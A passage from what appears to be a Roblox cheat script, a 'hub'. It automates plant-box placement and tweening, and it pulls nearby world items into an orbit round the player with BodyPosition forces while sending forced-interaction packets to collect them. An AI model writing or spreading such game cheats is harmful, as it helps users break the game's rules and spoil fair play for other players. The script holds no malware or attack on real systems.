        if not tweenplantboxtoggle.Value then task.wait(0.05); continue end
        local range = tonumber(tweenrangeslider.Value) or 250
        tweenplantbox(range)
    end
end)

task.spawn(function()
    while true do
        if not tweenbushtoggle.Value then task.wait(0.1); continue end
        local range = tonumber(tweenrangeslider.Value) or 20
        local selectedfruit = fruitdropdown.Value
        tweenpbs(range, selectedfruit)
    end
end)

-- Plant placement helper
placestructure = function(gridsize)
    if not plr or not plr.Character then return end
    local torso = plr.Character:FindFirstChild("HumanoidRootPart")
    if not torso then return end
    local startpos = torso.Position - Vector3.new(0,3,0)
    local spacing = 6.04
    for x = 0, gridsize-1 do
        for z = 0, gridsize-1 do
            task.wait(0.3)
            local position = startpos + Vector3.new(x*spacing, 0, z*spacing)
            if packets and packets.PlaceStructure and type(packets.PlaceStructure.send) == "function" then
                pcall(function() packets.PlaceStructure.send{["buildingName"]="Plant Box", ["yrot"]=45, ["vec"]=position, ["isMobile"]=false} end)
            end
        end
    end
end

-- Orbit logic (lighter guard)
local orbiton, orbitRange, orbitradius, orbitspeed, itemheight = false, 20, 10, 5, 3
local attacheditems, itemangles, lastpositions = {}, {}, {}
local itemsfolder = workspace:FindFirstChild("Items") or workspace

orbittoggle:OnChanged(function(value)
    orbiton = value
    if not orbiton then
        for _, bp in pairs(attacheditems) do pcall(function() bp:Destroy() end) end
        attacheditems = {}; itemangles = {}; lastpositions = {}
    else
        task.spawn(function()
            while orbiton do
                for item, bp in pairs(attacheditems) do
                    if item then
                        local currentpos = item.Position
                        local lastpos = lastpositions[item]
                        if lastpos and (currentpos - lastpos).Magnitude < 0.1 then
                            if packets and packets.ForceInteract and type(packets.ForceInteract.send) == "function" then
                                pcall(function() packets.ForceInteract.send(item:GetAttribute("EntityID")) end)
                            end
                        end
                        lastpositions[item] = currentpos
                    end
                end
                task.wait(0.1)
            end
        end)
    end
end)

-- Basic runs.RenderStepped orbit updater
runs.RenderStepped:Connect(function()
    if not orbiton then return end
    local time = tick() * orbitspeed
    for item, bp in pairs(attacheditems) do
        if item and bp and itemangles[item] then
            local angle = itemangles[item] + time
            pcall(function() bp.Position = root.Position + Vector3.new(math.cos(angle) * orbitradius, itemheight, math.sin(angle) * orbitradius) end)
        end
    end
end)

-- Attach items loop (guarded)
task.spawn(function()
    while true do
        if orbiton then
            local children = (workspace:FindFirstChild("Items") and workspace.Items:GetChildren()) or itemsfolder:GetChildren()
            local index = 0
            local anglestep = (math.pi * 2) / math.max(#children, 1)
            for _, item in pairs(children) do
                local primary = (item:IsA("BasePart") and item) or (item:IsA("Model") and item.PrimaryPart)
                if primary and (primary.Position - (root and root.Position or Vector3.new())).Magnitude <= orbitRange then
                    if not attacheditems[primary] then
                        local bp = Instance.new("BodyPosition")
                        bp.MaxForce, bp.D, bp.P, bp.Parent = Vector3.new(math.huge, math.huge, math.huge), 1500, 25000, primary
                        attacheditems[primary], itemangles[primary], lastpositions[primary] = bp, index * anglestep, primary.Position
                        index = index + 1
                    end
                end
            end
        end
        task.wait()
    end
end)

print("we love infra:", Luxt)
print("mainTab:", mainTab)
print("Done! Defensive Project Intra Hub loaded.")

if not success then
    warn("Script crashed:", err)
end
